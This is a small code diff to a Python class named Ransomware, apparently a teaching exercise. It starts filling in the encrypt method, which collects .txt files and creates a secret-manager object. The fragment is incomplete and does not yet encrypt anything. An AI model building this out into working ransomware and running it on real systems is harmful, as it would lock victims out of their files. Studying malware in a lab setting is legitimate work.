@@ -44,7 +44,8 @@ class Ransomware:
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        list = self.get_files("*.txt")
+        call = SecretManager()
 
     def decrypt(self):
         # main function for decrypting (see PDF)
